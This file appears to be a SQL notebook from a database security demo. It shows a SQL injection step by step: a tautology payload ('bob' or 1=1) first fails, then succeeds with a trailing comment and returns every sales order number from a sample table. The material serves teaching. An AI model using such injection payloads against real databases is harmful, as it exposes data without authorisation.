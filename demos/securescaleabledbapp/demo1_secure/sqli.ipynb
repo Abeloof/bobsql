{
    "metadata": {
        "kernelspec": {
            "name": "SQL",
            "display_name": "SQL",
            "language": "sql"
        },
        "language_info": {
            "name": "sql",
            "version": ""
        }
    },
    "nbformat_minor": 2,
    "nbformat": 4,
    "cells": [
        {
            "cell_type": "markdown",
            "source": [
                "Try to find all SalesOrders by injecting quotes and clever code without a comment"
            ],
            "metadata": {
                "azdata_cell_guid": "7c7db824-89ce-4707-b401-b370dcb3af52"
            },
            "attachments": {}
        },
        {
            "cell_type": "code",
            "source": [
                "SELECT SalesOrderNumber FROM SalesLT.SalesOrderHeader2 WHERE SalesOrderNumber = 'bob' or 1=1'\r\n",
                "GO"
            ],
            "metadata": {
                "azdata_cell_guid": "1af8ba8f-8573-42b6-a3d6-d4fca0657ed6"
            },
            "outputs": [
                {
                    "output_type": "error",
                    "evalue": "Execution failed due to an unexpected error: \r\n\tSQL Execution error: A fatal error occurred.\r\n\tIncorrect syntax was encountered while SELECT SalesOrderNumber FROM SalesLT.SalesOrderHeader2 WHERE SalesOrderNumber = 'bob' or 1=1'\r\nGO was being parsed.",
                    "ename": "",
                    "traceback": []
                },
                {
                    "output_type": "display_data",
                    "data": {
                        "text/html": "Total execution time: 00:00:00"
                    },
                    "metadata": {}
                }
            ],
            "execution_count": 8
        },
        {
            "cell_type": "markdown",
            "source": [
                "Try this again but this time put comments at the end before the final quote"
            ],
            "metadata": {
                "azdata_cell_guid": "1a3063b2-d006-4fbf-86a6-b89c5b5b5849"
            },
            "attachments": {}
        },
        {
            "cell_type": "code",
            "source": [
                "SELECT SalesOrderNumber FROM SalesLT.SalesOrderHeader2 WHERE SalesOrderNumber = 'bob' or 1=1--'\r\n",
                "GO"
            ],
            "metadata": {
                "azdata_cell_guid": "7bb52be3-996a-406a-8a14-d96c3ca9d69f",
                "tags": []
            },
            "outputs": [
                {
                    "output_type": "display_data",
                    "data": {
                        "text/html": "(32 rows affected)"
                    },
                    "metadata": {}
                },
                {
                    "output_type": "display_data",
                    "data": {
                        "text/html": "Total execution time: 00:00:00.004"
                    },
                    "metadata": {}
                },
                {
                    "output_type": "execute_result",
                    "metadata": {},
                    "execution_count": 9,
                    "data": {
                        "application/vnd.dataresource+json": {
                            "schema": {
                                "fields": [
                                    {
                                        "name": "SalesOrderNumber"
                                    }
                                ]
                            },
                            "data": [
                                {
                                    "0": "SO71774"
                                },
                                {
                                    "0": "SO71776"
                                },
                                {
                                    "0": "SO71780"
                                },
                                {
                                    "0": "SO71782"
                                },
                                {
                                    "0": "SO71783"
                                },
                                {
                                    "0": "SO71784"
                                },
                                {
                                    "0": "SO71796"
                                },
                                {
                                    "0": "SO71797"
                                },
                                {
                                    "0": "SO71815"
                                },
                                {
                                    "0": "SO71816"
                                },
                                {
                                    "0": "SO71831"
                                },
                                {
                                    "0": "SO71832"
                                },
                                {
                                    "0": "SO71845"
                                },
                                {
                                    "0": "SO71846"
                                },
                                {
                                    "0": "SO71856"
                                },
                                {
                                    "0": "SO71858"
                                },
                                {
                                    "0": "SO71863"
                                },
                                {
                                    "0": "SO71867"
                                },
                                {
                                    "0": "SO71885"
                                },
                                {
                                    "0": "SO71895"
                                },
                                {
                                    "0": "SO71897"
                                },
                                {
                                    "0": "SO71898"
                                },
                                {
                                    "0": "SO71899"
                                },
                                {
                                    "0": "SO71902"
                                },
                                {
                                    "0": "SO71915"
                                },
                                {
                                    "0": "SO71917"
                                },
                                {
                                    "0": "SO71920"
                                },
                                {
                                    "0": "SO71923"
                                },
                                {
                                    "0": "SO71935"
                                },
                                {
                                    "0": "SO71936"
                                },
                                {
                                    "0": "SO71938"
                                },
                                {
                                    "0": "SO71946"
                                }
                            ]
                        },
                        "text/html": [
                            "<table>",
                            "<tr><th>SalesOrderNumber</th></tr>",
                            "<tr><td>SO71774</td></tr>",
                            "<tr><td>SO71776</td></tr>",
                            "<tr><td>SO71780</td></tr>",
                            "<tr><td>SO71782</td></tr>",
                            "<tr><td>SO71783</td></tr>",
                            "<tr><td>SO71784</td></tr>",
                            "<tr><td>SO71796</td></tr>",
                            "<tr><td>SO71797</td></tr>",
                            "<tr><td>SO71815</td></tr>",
                            "<tr><td>SO71816</td></tr>",
                            "<tr><td>SO71831</td></tr>",
                            "<tr><td>SO71832</td></tr>",
                            "<tr><td>SO71845</td></tr>",
                            "<tr><td>SO71846</td></tr>",
                            "<tr><td>SO71856</td></tr>",
                            "<tr><td>SO71858</td></tr>",
                            "<tr><td>SO71863</td></tr>",
                            "<tr><td>SO71867</td></tr>",
                            "<tr><td>SO71885</td></tr>",
                            "<tr><td>SO71895</td></tr>",
                            "<tr><td>SO71897</td></tr>",
                            "<tr><td>SO71898</td></tr>",
                            "<tr><td>SO71899</td></tr>",
                            "<tr><td>SO71902</td></tr>",
                            "<tr><td>SO71915</td></tr>",
                            "<tr><td>SO71917</td></tr>",
                            "<tr><td>SO71920</td></tr>",
                            "<tr><td>SO71923</td></tr>",
                            "<tr><td>SO71935</td></tr>",
                            "<tr><td>SO71936</td></tr>",
                            "<tr><td>SO71938</td></tr>",
                            "<tr><td>SO71946</td></tr>",
                            "</table>"
                        ]
                    }
                }
            ],
            "execution_count": 9
        }
    ]
}